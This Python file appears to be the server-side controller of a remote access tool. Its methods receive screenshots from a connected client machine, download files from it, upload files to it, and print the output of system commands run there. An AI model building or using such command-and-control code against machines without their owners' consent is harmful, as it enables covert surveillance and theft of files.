"""
Here we define the operations we perform as a server, this should be the process that 
the server should perform when it receives the command response from the client
"""
import socket
import os
import datetime
import subprocess
import sys
import time
from operations.utils.datahandler import retrieve_data

class Operations:
    def __init__(self, client: socket.socket):
        self.client: socket.socket = client

    def hi(self):
        data = retrieve_data(self.client)
        print(data.decode("utf-8", "replace"))

    def get_cwd(self):
        self.client.sendall(str.encode("cwd"))
        return retrieve_data(self.client).decode("utf-8", "replace")

    def screenshot(self):
        file_name = str(datetime.datetime.now().time())

        file_name = file_name.split(".")[0].replace(":", "-")
        file_name = file_name + '.png'
        try:
            with open(file_name, "wb") as f:
                image = retrieve_data(self.client)
                f.write(image)
        except:
            print("Error in saving the image")

    def download(self, save_as: str):
        content = retrieve_data(self.client)
        if content == b'File not found':
            print("File not found")
            return

        try:
            with open(save_as, "wb") as f:
                f.write(content)
        except Exception as e:
            print("Error in saving the file: ", e)


    def upload(self, filename: str):
        if not os.path.exists(filename):
            print("File not found")
            return

        with open(filename, "rb") as file:
            while True:
                file_data = file.read()
                if not file_data:
                    break
                self.client.sendall(file_data)
        self.client.sendall(str.encode("done\n\n"))
        retrieve_data(self.client) # clean buffer pleaseuwu

    def exit(self):
        data = retrieve_data(self.client)
        print(data.decode("utf-8", "replace"))
        sys.exit()

    def system_command(self):
        data = retrieve_data(self.client)
        print(data.decode("utf-8", "replace"))